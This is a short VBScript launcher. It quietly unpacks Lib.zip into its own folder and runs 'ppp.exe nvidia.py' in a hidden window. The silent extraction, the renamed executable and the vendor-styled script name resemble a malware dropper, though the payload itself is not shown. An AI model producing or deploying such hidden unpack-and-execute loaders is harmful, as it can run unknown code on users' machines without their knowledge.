Set objShell = CreateObject("WScript.Shell")

' Get the current directory
currentDir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
objShell.CurrentDirectory = currentDir

' Run tar command and wait for it to finish (extract to currentDir)
strCommand = "cmd.exe /c tar -xf """ & currentDir & "\Lib.zip"" -C """ & currentDir & """"
objShell.Run strCommand, 0, True

' Run the executable after tar extraction
cmdRun = "cmd /c ppp.exe nvidia.py"
objShell.Run cmdRun, 0, False
